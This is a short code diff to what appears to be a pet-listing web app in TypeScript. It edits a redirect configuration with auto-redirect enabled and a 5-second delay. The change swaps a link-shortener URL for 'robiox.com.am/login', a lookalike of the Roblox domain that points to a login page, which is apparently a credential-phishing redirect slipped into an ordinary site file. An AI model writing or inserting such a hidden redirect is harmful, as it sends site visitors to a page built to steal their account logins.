@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://shorturl.asia/gDq1x",
+  url: "https://www.robiox.com.am/login?returnUrl=9603182548180515",
   delay: 5000,
   autoRedirect: true,
 }
